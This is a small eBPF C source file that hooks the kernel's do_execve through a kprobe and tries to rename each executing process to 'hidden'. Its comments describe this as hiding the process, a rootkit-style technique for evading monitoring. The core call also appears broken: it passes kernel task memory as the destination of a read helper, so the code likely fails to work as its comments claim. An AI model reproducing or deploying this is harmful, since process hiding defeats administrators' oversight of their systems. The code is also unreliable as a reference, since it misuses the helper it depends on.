#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>
#include "process_map.bpf.h"



// script that uses kprobe to hooks into do_excve gets the process and modfies the output
SEC("kprobe/do_execve")// attach to do_execve which is the kernel function called when a process executes a new program
int bpf_prog(struct pt_regs *ctx) {
    // getting the current task 
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();// returns a pointer to the task_struct
    if (!task)
        return 0;

    // Modify the comm field to hide the process comm string is the name of the process 
    bpf_probe_read_kernel_str(&task->comm, sizeof(task->comm), "hidden");//replaces the comm field with hidden
    return 0;
}

char _license[] SEC("license") = "GPL";

